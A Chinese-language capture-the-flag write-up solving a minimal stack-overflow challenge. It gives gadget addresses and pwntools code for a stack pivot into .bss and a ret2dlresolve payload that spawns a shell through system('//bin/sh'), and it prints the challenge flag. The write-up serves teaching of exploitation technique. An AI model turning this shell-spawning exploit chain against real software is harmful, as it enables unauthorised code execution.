# overly simplified pwn challenge

## 题目简述

程序只有一行实质逻辑：用 `fgets(buf, 0x80, stdin)` 向 1 字节栈缓冲区读入数据。二进制无 PIE、无栈 Canary，但体积过小，几乎没有常见参数控制 gadget。需要利用 `main` 自身的读入片段完成栈迁移，再用 ret2dlresolve 动态解析 `system`。

## 解题过程

从 `buf` 到返回地址只有 9 字节。二进制中可用的关键位置为：

```text
0x40111d: pop rbp; ret
0x401142: mov rdx, [stdin]
           lea rax, [rbp-1]
           mov esi, 0x80
           mov rdi, rax
           call fgets@plt
           leave
           ret
```

第一阶段覆盖返回地址，令 `rbp = 0x404a00` 后跳到 `0x401142`：

```python
stage1 = b"A" * 9
stage1 += p64(0x40111d)
stage1 += p64(0x404a00)
stage1 += p64(0x401142)
```

这会把第二阶段读到可写的 `.bss` 地址 `rbp - 1 = 0x4049ff`，随后 `leave; ret` 把栈迁移到 `.bss`。第二阶段开头放置 `//bin/sh\x00`；迁移时 `pop rbp` 消耗从 `0x404a00` 开始的 `/bin/sh\x00`，下一项正好进入 ret2dlresolve ROP 链。

使用 pwntools 在 `0x404a30` 构造伪造的字符串表项 `system`、`Elf64_Sym` 和 `Elf64_Rela`，并把重定位目标改为 `fgets@GOT`：

```python
dl = Ret2dlresolvePayload(
    elf, symbol="system", args=[], data_addr=0x404a30
)
rela = dl.payload[-24:]
rela = p64(elf.got.fgets) + rela[8:]
resolve_data = dl.payload[:-24] + rela

rop = ROP(elf)
rop.ret2dlresolve(dl)
```

第二次 `fgets` 返回后，`rdi` 仍指向 `0x4049ff`，也就是 `//bin/sh`。动态解析器把 `system` 地址写入目标 GOT 并跳转时，无需额外的 `pop rdi`，便直接执行 `system("//bin/sh")`。最终得到：

```text
grey{i_actually_understand_ret2dlresolve}
```

## 方法总结

极小二进制的难点通常是 gadget 不足。这里复用函数中段，同时得到可控读入和 `leave; ret` 栈迁移；ret2dlresolve 则让动态链接器替攻击者解析未导入的 `system`。更细的一点是利用 `fgets` 调用遗留的 `rdi`，省掉不存在的参数 gadget。构造时要逐字节核对 `.bss` 布局、伪重定位地址和栈对齐。
